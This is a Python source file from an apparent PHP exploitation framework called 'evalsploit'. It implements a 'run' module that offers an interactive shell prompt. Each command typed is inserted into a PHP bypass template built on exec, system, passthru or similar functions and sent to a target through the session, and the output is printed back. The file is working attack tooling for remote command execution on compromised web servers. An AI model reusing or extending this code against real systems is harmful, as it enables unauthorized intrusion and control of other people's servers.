"""run: command-line mode via exec/shell_exec/..."""

from __future__ import annotations

from pathlib import Path
from typing import TYPE_CHECKING, Optional

from evalsploit.config import project_root
from evalsploit.modules.base import substitute, php_quote
from evalsploit.modules.registry import register
from evalsploit.modules.base import Module

if TYPE_CHECKING:
    from evalsploit.context import SessionContext


EXEC_NAMES = ("exec", "shell_exec", "system", "passthru", "popen", "proc_open", "expect_popen", "pcntl_exec", "do")


@register("run")
class RunModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        shell = ctx.config.run_shell
        if shell not in EXEC_NAMES:
            shell = "exec"
        path = project_root() / "bypasses" / "exec" / f"{shell}.php"
        if not path.exists():
            print(f"Bypass file not found: {path}")
            return None
        php_template = path.read_text(encoding="utf-8", errors="replace")
        prompt = f"{shell}> "
        while True:
            try:
                cmd = input(prompt)
            except EOFError:
                break
            if cmd.strip().lower() == "exit":
                break
            php = substitute(php_template, {"$_LOCAL": php_quote(cmd)})
            out = ctx.send(php)
            print(out)
        return None